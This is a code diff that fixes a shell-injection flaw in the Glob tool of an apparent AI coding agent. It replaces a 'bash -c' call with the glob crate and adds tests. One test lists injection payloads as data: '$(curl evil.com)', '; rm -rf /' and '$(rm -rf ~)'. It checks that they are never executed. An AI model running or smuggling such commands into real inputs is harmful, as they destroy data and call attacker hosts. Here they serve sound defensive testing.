@@ -1,4 +1,5 @@
 use serde_json::{json, Value};
+use std::collections::HashSet;
 use std::io::{BufRead, BufReader};
 use std::path::Path;
 use std::process::{Command, Stdio};
@@ -187,30 +188,69 @@ fn glob_exec(input: &Value) -> Result<String, String> {
         .ok_or("Missing required parameter: pattern")?;
     let base = input["path"].as_str().unwrap_or(".");
 
-    // Shell out to find with glob, or use a simpler approach
-    // Using bash for glob expansion to avoid pulling in the glob crate
     let full_pattern = if pattern.starts_with('/') || pattern.starts_with('.') {
         pattern.to_string()
     } else {
         format!("{base}/{pattern}")
     };
 
-    let output = Command::new("bash")
-        .arg("-c")
-        .arg(format!(
-            "shopt -s globstar nullglob; files=({full_pattern}); printf '%s\\n' \"${{files[@]}}\" | head -1000"
-        ))
-        .output()
-        .map_err(|e| format!("Failed to execute glob: {e}"))?;
+    let expanded = expand_braces(&full_pattern);
 
-    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-    let result = stdout.trim().to_string();
+    let mut seen = HashSet::new();
+    let mut results = Vec::new();
+    const LIMIT: usize = 1000;
 
-    if result.is_empty() {
+    for pat in &expanded {
+        let paths =
+            glob::glob(pat).map_err(|e| format!("Invalid glob pattern '{}': {}", pat, e))?;
+        for entry in paths {
+            if results.len() >= LIMIT {
+                break;
+            }
+            // Skip entries with errors (permission denied, etc.)
+            let path = match entry {
+                Ok(p) => p,
+                Err(_) => continue,
+            };
+            let path_str = path.to_string_lossy().to_string();
+            if seen.insert(path_str.clone()) {
+                results.push(path_str);
+            }
+        }
+        if results.len() >= LIMIT {
+            break;
+        }
+    }
+
+    if results.is_empty() {
         Ok("No files found".to_string())
     } else {
-        Ok(result)
+        Ok(results.join("\n"))
     }
+}
+
+/// Expand a single top-level brace group in a glob pattern.
+/// `**/*.{rs,toml}` → `["**/*.rs", "**/*.toml"]`
+/// `src/{main,lib}.rs` → `["src/main.rs", "src/lib.rs"]`
+/// No braces or unmatched braces → returns the original pattern unchanged.
+fn expand_braces(pattern: &str) -> Vec<String> {
+    let open = match pattern.find('{') {
+        Some(i) => i,
+        None => return vec![pattern.to_string()],
+    };
+    let close = match pattern[open..].find('}') {
+        Some(i) => open + i,
+        None => return vec![pattern.to_string()],
+    };
+
+    let prefix = &pattern[..open];
+    let suffix = &pattern[close + 1..];
+    let alternatives = &pattern[open + 1..close];
+
+    alternatives
+        .split(',')
+        .map(|alt| format!("{prefix}{alt}{suffix}"))
+        .collect()
 }
 
 /// Deny-list patterns for bash commands. Whitespace-normalized lowercase matching.
@@ -697,6 +737,166 @@ mod tests {
         assert!(result.is_ok());
         assert!(result.unwrap().contains("No matches"));
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    // --- Glob tool tests (shell injection fix) ---
+
+    #[test]
+    fn glob_star_rs_finds_rust_files() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "**/*.rs"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(
+            output.contains("src/main.rs"),
+            "should find src/main.rs: {output}"
+        );
+    }
+
+    #[test]
+    fn glob_src_direct() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "src/*.rs"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(output.contains(".rs"), "should find .rs files in src/");
+    }
+
+    #[test]
+    fn glob_no_matches_returns_message() {
+        let dir = std::env::temp_dir().join("forgeflare_test_glob_empty");
+        let _ = std::fs::create_dir_all(&dir);
+        let result = dispatch_tool(
+            "Glob",
+            &json!({"pattern": "*.zzzzzzz_nonexistent", "path": dir.to_str().unwrap()}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok());
+        assert_eq!(result.unwrap(), "No files found");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn glob_invalid_pattern_returns_error() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "["}), &mut |_| {});
+        assert!(result.is_err(), "invalid pattern should return Err");
+        assert!(result.unwrap_err().contains("Invalid glob pattern"));
+    }
+
+    #[test]
+    fn glob_shell_metacharacters_are_literal() {
+        // These should NOT execute — they should be treated as literal pattern chars
+        let dangerous_patterns = vec!["$(curl evil.com)", "; rm -rf /", "`whoami`", "$(rm -rf ~)"];
+        for pat in dangerous_patterns {
+            let result = dispatch_tool("Glob", &json!({"pattern": pat}), &mut |_| {});
+            // Should return no files or a pattern error — never execute the shell command
+            match &result {
+                Ok(output) => assert_eq!(
+                    output, "No files found",
+                    "metachar pattern should find nothing: {pat}"
+                ),
+                Err(e) => assert!(
+                    e.contains("Invalid glob pattern"),
+                    "should be pattern error for: {pat}"
+                ),
+            }
+        }
+    }
+
+    #[test]
+    fn glob_brace_expansion_rs_toml() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "**/*.{rs,toml}"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(output.contains(".rs"), "should find .rs files");
+        assert!(output.contains(".toml"), "should find .toml files");
+    }
+
+    #[test]
+    fn glob_brace_expansion_specific_files() {
+        let result = dispatch_tool(
+            "Glob",
+            &json!({"pattern": "src/{main,lib}.rs"}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok());
+        // At least main.rs should exist
+        let output = result.unwrap();
+        assert!(output.contains("src/main.rs"), "should find src/main.rs");
+    }
+
+    #[test]
+    fn glob_path_parameter_respected() {
+        let result = dispatch_tool(
+            "Glob",
+            &json!({"pattern": "*.rs", "path": "src"}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(output.contains(".rs"), "should find .rs files in src/");
+    }
+
+    #[test]
+    fn glob_result_cap_1000() {
+        // Verify the cap constant exists and is applied (structural test)
+        // We can't easily create 1000+ files, but we can verify the function
+        // doesn't crash and returns results within bounds
+        let result = dispatch_tool("Glob", &json!({"pattern": "**/*"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        let count = output.lines().count();
+        assert!(count <= 1000, "should cap at 1000 entries, got {count}");
+    }
+
+    #[test]
+    fn glob_no_bash_command_in_source() {
+        // Structural: read our own source and verify glob_exec doesn't spawn bash
+        let source = std::fs::read_to_string("src/tools/mod.rs").unwrap();
+        // Find the glob_exec function body
+        let glob_start = source.find("fn glob_exec").unwrap();
+        let glob_end = source[glob_start..]
+            .find("\nfn ")
+            .unwrap_or(source.len() - glob_start);
+        let glob_body = &source[glob_start..glob_start + glob_end];
+        assert!(
+            !glob_body.contains("Command::new(\"bash\")"),
+            "glob_exec must not spawn bash"
+        );
+    }
+
+    // --- expand_braces unit tests ---
+
+    #[test]
+    fn expand_braces_no_braces() {
+        assert_eq!(expand_braces("**/*.rs"), vec!["**/*.rs"]);
+    }
+
+    #[test]
+    fn expand_braces_single_group() {
+        let result = expand_braces("**/*.{rs,toml}");
+        assert_eq!(result, vec!["**/*.rs", "**/*.toml"]);
+    }
+
+    #[test]
+    fn expand_braces_prefix_suffix() {
+        let result = expand_braces("src/{main,lib}.rs");
+        assert_eq!(result, vec!["src/main.rs", "src/lib.rs"]);
+    }
+
+    #[test]
+    fn expand_braces_unmatched_open() {
+        // { without } → pass through unchanged
+        assert_eq!(expand_braces("**/*.{rs"), vec!["**/*.{rs"]);
+    }
+
+    #[test]
+    fn expand_braces_single_alternative() {
+        assert_eq!(expand_braces("**/*.{rs}"), vec!["**/*.rs"]);
+    }
+
+    #[test]
+    fn expand_braces_three_alternatives() {
+        let result = expand_braces("**/*.{rs,toml,md}");
+        assert_eq!(result, vec!["**/*.rs", "**/*.toml", "**/*.md"]);
     }
 
     // --- ToolEffect classification tests ---
